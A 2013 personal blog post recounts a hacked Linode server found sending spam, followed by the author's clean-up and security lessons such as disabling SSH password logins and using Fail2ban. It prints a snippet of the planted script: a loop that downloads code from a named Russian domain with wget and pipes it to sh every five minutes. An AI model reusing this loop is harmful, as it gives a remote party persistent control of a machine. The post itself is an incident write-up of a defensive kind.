---
layout: post
title:  "All systems go."
date:   2013-09-09 03:41:00-0800
---

### The backstory.

About a month ago in the early hours of the morning, I got a rather disturbing
email from [Linode](http://linode.com) (the folks who graciously host my various
websites and services). Its subject line went something like this:

> rapture (linode12345) - Terms of Service Violation - Spam

`rapture` was the name of the server running codykrieger.com (superseded by
krieger.io). It also hosted downloads for [gfxCardStatus](http://gfx.io).

Reading the subject line of that message made my stomach churn. As far as I was
aware, I hadn't been sending any spam.

I nervously opened the message, and read the following:

> We have received a report of spam originating from your Linode. We ask that you
> investigate this matter as soon as possible to determine why mailings
> originating from your Linode are being marked as spam. If you were not aware
> that activity of this nature was originating from your Linode, it is likely
> that your Linode has been compromised, and you'll want to take appropriate action.

Yep, it appeared that my server had been compromised. Great.

### The diagnosis.

I quickly shut down the machine, logged into another Linode, and started
copying the contents of `rapture`'s disk into an image that I could poke around
inside to determine the extent of the damage. I eventually stumbled upon a
script, `/usr/bin/smpl`, that was pretty damning. Here's the most interesting
part of the script:

{% highlight bash %}
while [ 1 ];
do
wget -q -O - medobra.ru/resident | sh - &
sleep 300
done
{% endhighlight %}

Yeah, because that's not horrible or anything. Who doesn't like fetching the
contents of arbitrary documents at weird Russian domain names and running the
output directly in a shell?

Even worse was the modification date of this file: `12 Jun 2013`. The
attacker had access to my server for *nearly two months* before anyone noticed.

What a fantastic way to start the day.

Unfortunately, my logs didn't go back far enough to determine when the first
successful malicious login attempt succeeded, and via which user account. I can
only speculate that a botnet managed to brute-force the password on one of the
accounts, and then either used that account's `sudo` privileges (if it had any),
or used an exploit of some kind, to gain root access.

### Lessons learned.

I'm all back up and running now, but I learned a few really valuable lessons
along the way:

- *Make damn sure password authentication for SSH is turned off, and use
  public key authentication instead.* I swore that I had disabled it some time
  ago in favor of using public key authentication exclusively&hellip;but
  apparently not.
- *Use some kind of tool to automatically ban repeated unsuccessful SSH login
  attempts (i.e. Fail2ban).* My logs indicated that I was under attack by an
  absurdly large number of machines on a daily basis, and I was doing nothing
  to stop them preemptively.
- *Set up some kind of early warning system.* Maybe have your servers email/text
  you when someone logs in via SSH, and set up logwatch to email you reports of
  system activity on a regular basis.

I've spent the last month creating an automated server provisioning process
that will allow me to iterate on the quality of my security measures as time
goes on. This process is idempotent, so I can run it on a new or existing
machine, and it'll bring everything up-to-spec without making me start from
scratch. It also sets up all of the initial user accounts, packages, and
services that I need to run, so my setup time for new servers is at an absolute
minimum.

In some kind of sick, twisted way, I guess I have this mysterious havoc-wreaker
to thank for making me about eighty times more security conscious&hellip;but at the
same time, I can't ignore the fact that I just spent a ridiculous amount of time
cleaning up a mess that I had absolutely no desire to clean up.

So, to whoever is responsible for this: you are a terrible human being. I hope
that the rest of your miserable life is peppered by the frequent and repeated
stubbing of your toes.
